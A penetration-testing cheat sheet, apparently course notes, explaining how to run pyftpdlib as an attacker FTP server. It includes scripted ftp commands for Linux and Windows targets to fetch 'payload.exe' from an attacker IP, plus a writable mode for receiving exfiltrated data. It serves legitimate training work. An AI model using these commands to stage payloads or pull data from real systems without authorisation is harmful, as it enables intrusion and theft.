# pyftpdlib

**Tags:** #pyftpdlib #FileTransfer #FTP #Python #PostExploitation #Exfiltration

`pyftpdlib` is a Python FTP server library that runs as a one-command standalone server. Useful when the target has no HTTP client you can reach but does have a native FTP client — every Windows build ships `ftp.exe`, and it scripts cleanly from a non-interactive shell, which matters when you only have blind command execution.

**Source:** https://github.com/giampaolo/pyftpdlib
**Install:** `pip3 install pyftpdlib`

```bash
# Anonymous read-only (serve payloads TO the target)
sudo python3 -m pyftpdlib --port 21

# Writable (receive exfil FROM the target)
sudo python3 -m pyftpdlib --port 21 --write

# Non-privileged port + specific directory
python3 -m pyftpdlib --port 2121 --directory /tmp/share --write
```

```bash
# Pull from a Linux target, non-interactively
ftp -inv 10.10.14.5 <<EOF
user anonymous ""
binary
get payload
bye
EOF
```

```powershell
# Windows target — ftp.exe is interactive by default, so script it
echo open 10.10.14.5 > ftp.txt
echo anonymous >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET payload.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

> [!warning] `--write` with anonymous auth means anyone who finds the port can write to your box. Bind it to the engagement VPN interface and shut it down when the transfer finishes.

> [!note] Plain FTP is cleartext and uses a second data connection on a random port — it breaks through restrictive egress filtering far less often than HTTP. Reach for it when HTTP is blocked, not as a default.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] — FTP-based staging and exfil when HTTP isn't available.

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
